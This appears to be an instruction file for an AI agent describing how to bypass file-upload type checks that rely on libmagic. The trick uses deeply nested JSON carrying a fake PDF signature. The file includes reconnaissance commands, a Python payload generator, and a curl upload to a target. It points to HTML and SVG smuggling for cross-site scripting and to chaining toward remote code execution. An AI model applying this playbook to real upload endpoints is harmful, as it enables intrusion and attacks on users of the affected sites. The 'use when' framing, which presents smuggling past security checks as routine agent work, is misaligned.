---
name: libmagic-type-confusion
description: Bypass file type detection using libmagic's JSON nesting depth limit to force type confusion. Use when file uploads validate type via libmagic or the file command and you need to smuggle executable content past MIME checks.
---

# libmagic Type Confusion via Deep JSON Nesting

## Pattern
- Application validates upload type using `file` or libmagic bindings
- Dangerous formats (HTML, SVG, script-capable) are blocked
- A later processing stage handles the uploaded file based on detected type

## Workflow

### 1. Detect libmagic usage
```bash
# Check if target uses libmagic/file command for validation
rg -i "finfo|magic_open|python-magic|ruby-filemagic|file_get_contents.*mime" --type py --type rb --type php src/

# Check file command version (depth limit varies)
file --version 2>&1 | head -1
```

**Checkpoint:** If target uses Node.js-only MIME, Apache Tika, or .NET-native detection, this technique does not apply.

### 2. Determine depth threshold

| Version | JSON depth limit | Nesting needed |
|---------|------------------|----------------|
| libmagic 5.41 | ~10 levels | easy |
| libmagic 5.46+ | ~500 levels | 510+ levels |

### 3. Generate confused payload
```python
#!/usr/bin/env python3
import json, sys

def make_payload(depth=510, target_sig="%PDF-1.4"):
    obj = "terminal"
    for i in range(depth):
        obj = {f"l{i}": obj}
    obj["_sig"] = target_sig + "\n1 0 obj\n<<\n/Type /Catalog\n>>\nendobj\n%%EOF"
    with open("confused.json", "w") as f:
        json.dump(obj, f)

make_payload()
```

### 4. Verify confusion locally
```bash
python3 -c "
import json
obj = 'x'
for i in range(510): obj = {f'l{i}': obj}
obj['_sig'] = '%PDF-1.4\n1 0 obj\n<<\n/Type /Catalog\n>>\nendobj\n%%EOF'
open('confused.json','w').write(json.dumps(obj))
"
file confused.json
# Expected: "PDF document" instead of "JSON data"
```

**Checkpoint:** If `file` still reports JSON, increase depth or check version. If it reports the target type, proceed.

### 5. Upload and trigger downstream handler
```bash
curl -x localhost:8080 -k "https://target.com/upload" \
  -F "file=@confused.json;type=application/json"
```

The goal is not just misclassification -- confirm the file reaches a parser, renderer, or execution path that trusts the reported type.

## Practical Payloads

- **PDF smuggling**: embed `%PDF-1.4` header + minimal structure -> routes to PDF pipeline
- **HTML smuggling**: on older libmagic, shallow nesting hides HTML/SVG from JSON detection
- **SVG smuggling**: embed SVG signature for XSS via image processing pipelines

## Affected Libraries
- C/C++, Perl, Ruby, PHP `finfo`, Python `python-magic`, Go libmagic wrappers
- NOT affected: Node.js-only MIME, Apache Tika, .NET-native detection, Rust-native detection

## Chain With
- `dom-vulnerability-detection` (if HTML/SVG smuggled)
- `write-path-to-rce` (if file write achieved)
- `parser-differential-bypass` (complementary technique)

## References
- https://lab.ctbb.show/research/libmagic-inconsistencies-that-lead-to-type-confusion
- https://github.com/file/file/blob/master/src/is_json.c
